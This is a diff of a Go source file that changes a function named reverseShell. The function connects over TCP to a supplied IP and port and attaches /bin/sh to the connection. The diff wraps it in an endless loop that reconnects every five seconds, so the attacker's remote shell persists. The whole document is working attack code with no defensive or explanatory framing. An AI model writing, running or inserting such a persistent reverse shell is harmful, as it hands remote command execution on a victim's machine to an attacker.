@@ -9,15 +9,19 @@ import (
     "runtime"
     "strings"
     "flag"
+    "time"
 )
 
 func reverseShell(ip string, port string) {
-    c, _ := net.Dial("tcp", ip + ":" + port)
-    cmd := exec.Command("/bin/sh")
-    cmd.Stdin=c
-    cmd.Stdout=c
-    cmd.Stderr=c
-    cmd.Run()
+    for {
+        c, _ := net.Dial("tcp", ip + ":" + port)
+        cmd := exec.Command("/bin/sh")
+        cmd.Stdin=c
+        cmd.Stdout=c
+        cmd.Stderr=c
+        cmd.Run()
+        time.Sleep(5 * time.Second)
+    }
 }
 
 
